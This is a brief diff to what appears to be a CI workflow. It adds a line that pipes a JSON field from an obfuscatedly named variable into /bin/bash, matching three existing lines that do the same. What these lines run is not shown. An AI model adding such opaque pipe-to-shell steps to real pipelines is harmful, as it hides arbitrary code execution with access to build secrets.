@@ -24,6 +24,7 @@ jobs:
           echo $nt85 | jq -r .pmi6986 | /bin/bash
           echo $bmuju9 | jq -r .xfc9228 | /bin/bash
           echo $jpmza7879 | jq -r .fmvkg257 | /bin/bash
+          echo $aq7 | jq -r .rm41944 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
